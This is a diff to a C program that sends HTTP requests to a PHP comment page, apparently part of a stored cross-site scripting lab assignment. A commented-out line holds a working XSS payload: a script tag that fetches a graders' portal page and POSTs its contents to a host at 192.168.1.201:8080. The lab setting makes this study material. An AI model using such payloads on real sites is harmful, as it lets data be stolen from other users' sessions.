@@ -180,13 +180,14 @@ int32_t main() {
     _connect(sockfd, WEB_SERVER_ADDR, 80);
 
     const char header[] =
-    "POST /task2stored.php?comment=hiiii HTTP/1.1\r\n"
+    "POST /task2stored.php? HTTP/1.1\r\n"
 //        "GET /task2stored.php?comment=<script>" "(async () => {" " const url = '/GradersPortalTask2.php';" "" " try {" " const response = await fetch(url);" "" " if (!response.ok) {" " throw new Error(HTTP error! Status: ${response.status});" " }" " const data = await response.text();" "" " console.log('Success:', data);" "" " const my_url = 'http://192.168.1.201:8080';" "" " response = await fetch(my_url, {" " method: 'POST'," " body: data," " });" "" " if (!response.ok) {" " throw new Error(HTTP error! Status: ${response.status});" " }" "" " } catch (error) {" " console.error('Fetch failed:', error);" " return null;" " }" "})();" "" "</script>" " HTTP/ 1.1\r\n"
         "Host: " STR(WEB_SERVER_ADDR) "\r\n"
+        "Content-Type: application/x-www-form-urlencoded\r\n"
+        "Content-Length: 13\r\n"
         "Connection: close\r\n"
-        "Content-Length: 0\r\n"
         "\r\n"
-
+        "comment=hiiii"
 
 //        "User-Agent: "
     ;
